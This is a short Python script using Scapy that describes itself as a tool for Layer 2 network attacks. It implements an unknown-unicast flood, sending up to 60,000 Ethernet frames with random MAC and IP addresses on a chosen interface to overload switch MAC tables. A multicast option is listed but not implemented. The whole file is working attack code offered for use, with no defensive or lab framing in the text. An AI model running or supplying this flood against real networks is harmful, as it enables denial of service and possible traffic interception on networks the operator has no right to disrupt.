#!/usr/bin/python3

# Scapy for Python3 - apt-get install python3-scapy

import argparse
from scapy.all import *

# create parser
main_parser = argparse.ArgumentParser(description='Execute various Layer 2 network attacks.')

subparsers = main_parser.add_subparsers(dest='action')

flood_parser = subparsers.add_parser('flood',help='Flood packages')

main_parser.add_argument("-v","--verbose", help="Increase output verbosity",action="store_true")
main_parser.add_argument("-i","--interface", help="Network Interface",default="ens33")


flood_parser.add_argument("-t","--floodtype",help="Flood type", choices =["unknown_unicast","unknown_multicast"], required=True)
flood_parser.add_argument("-c","--packetcount",help="Amount of packets", default=60000,type=int)

main_args = main_parser.parse_args()
action = main_args.action



def unicast_flood(iface=main_args.interface):
    print("Generating",main_args.packetcount,"unciast flood packets")
    # generate packets
    packet_list = []
    
    for i in range(1, main_args.packetcount):
        src_mac = RandMAC()
        dst_mac = RandMAC()
        frame = Ether(src=src_mac, dst=dst_mac) / IP(dst="0.0.0.0", src=RandIP())
        packet_list.append(frame)

    print("Sending packets")
    sendp(packet_list, iface=iface)
    print("done")



if action=="flood":
   if main_args.floodtype == "unknown_unicast":
      unicast_flood()
